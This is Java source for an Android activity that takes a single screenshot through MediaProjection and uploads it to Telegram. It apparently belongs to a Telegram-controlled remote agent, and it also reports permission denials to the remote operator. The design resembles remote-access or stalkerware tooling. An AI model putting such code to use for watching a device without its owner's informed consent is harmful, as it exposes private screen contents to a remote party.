package com.thunderx.telegramagent;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.WindowManager;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;

public class CaptureActivity extends Activity {
    private static final String TAG = "CaptureActivity";
    private static final int REQUEST_CODE = 1001;

    private MediaProjectionManager projectionManager;
    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;
    private Handler handler;
    private int screenWidth, screenHeight, screenDensity;
    private boolean frameSent = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        handler = new Handler(Looper.getMainLooper());

        projectionManager = (MediaProjectionManager)
                getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        Intent intent = projectionManager.createScreenCaptureIntent();
        startActivityForResult(intent, REQUEST_CODE);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        if (requestCode == REQUEST_CODE && resultCode == RESULT_OK && data != null) {
            mediaProjection = projectionManager.getMediaProjection(resultCode, data);
            startScreenCapture();
        } else {
            TelegramAgentService.sendMessage("❌ Screen capture permission denied.");
            finish();
        }
    }

    private void startScreenCapture() {
        DisplayMetrics metrics = new DisplayMetrics();
        WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        wm.getDefaultDisplay().getMetrics(metrics);

        screenWidth = metrics.widthPixels;
        screenHeight = metrics.heightPixels;
        screenDensity = metrics.densityDpi;

        // Max images = 2 (front buffer + back buffer)
        imageReader = ImageReader.newInstance(
                screenWidth, screenHeight,
                PixelFormat.RGBA_8888, 2);

        virtualDisplay = mediaProjection.createVirtualDisplay(
                "ScreenCapture",
                screenWidth, screenHeight, screenDensity,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader.getSurface(),
                null, handler);

        imageReader.setOnImageAvailableListener(reader -> {
            if (frameSent) return;  // Send only one frame

            Image image = null;
            try {
                image = reader.acquireLatestImage();
                if (image == null) return;

                frameSent = true;
                Bitmap bitmap = imageToBitmap(image, screenWidth, screenHeight);
                if (bitmap == null) return;

                // Scale down to half size for faster upload
                int scaledW = screenWidth / 2;
                int scaledH = screenHeight / 2;
                Bitmap scaled = Bitmap.createScaledBitmap(bitmap, scaledW, scaledH, true);

                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                scaled.compress(Bitmap.CompressFormat.JPEG, 50, baos);
                byte[] jpeg = baos.toByteArray();

                Log.d(TAG, "JPEG size: " + (jpeg.length / 1024) + " KB");
                TelegramAgentService.sendPhotoToTelegram(jpeg, scaledW, scaledH);

                bitmap.recycle();
                scaled.recycle();
            } catch (Exception e) {
                Log.e(TAG, "Capture error", e);
            } finally {
                if (image != null) image.close();
                // Stop capture after sending the frame
                handler.postDelayed(this::stopCapture, 500);
            }
        }, handler);
    }

    /** Convert ImageReader Image to Bitmap */
    private Bitmap imageToBitmap(Image image, int width, int height) {
        Image.Plane[] planes = image.getPlanes();
        ByteBuffer buffer = planes[0].getBuffer();
        int pixelStride = planes[0].getPixelStride();
        int rowStride = planes[0].getRowStride();
        int rowPadding = rowStride - pixelStride * width;

        // Create bitmap with row padding
        Bitmap padded = Bitmap.createBitmap(
                width + rowPadding / pixelStride,
                height,
                Bitmap.Config.ARGB_8888);
        padded.copyPixelsFromBuffer(buffer);

        // Crop the padding
        Bitmap cropped = Bitmap.createBitmap(padded, 0, 0, width, height);
        if (cropped != padded) padded.recycle();
        return cropped;
    }

    private void stopCapture() {
        try {
            if (virtualDisplay != null) {
                virtualDisplay.release();
                virtualDisplay = null;
            }
            if (imageReader != null) {
                imageReader.close();
                imageReader = null;
            }
            if (mediaProjection != null) {
                mediaProjection.stop();
                mediaProjection = null;
            }
        } catch (Exception e) {
            Log.e(TAG, "Stop error", e);
        }
        finish();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        stopCapture();
    }
}